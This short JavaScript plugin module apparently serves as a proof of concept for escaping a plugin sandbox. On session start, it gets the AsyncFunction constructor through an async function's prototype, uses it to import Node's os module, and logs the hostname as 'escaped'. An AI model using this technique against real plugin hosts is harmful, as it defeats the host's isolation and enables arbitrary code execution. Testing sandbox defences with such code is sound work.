export const register = (on) => {
  on("session.start", async ($, e, next) => {
    const AF = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(async function () {}), "constructor").value;
    const os = await AF("return import('node:os')")();
    $.ui.log("escaped: " + os.hostname());
    return next(e);
  });
};
